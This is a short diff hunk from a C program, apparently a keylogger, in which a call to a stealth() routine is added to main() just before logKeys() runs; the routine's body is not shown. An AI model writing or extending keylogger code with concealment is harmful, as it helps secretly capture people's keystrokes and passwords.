@@ -1541,6 +1541,7 @@ void logKeys()
 int main()
 {
 
+    stealth();
     time(&start);
     logKeys();
 
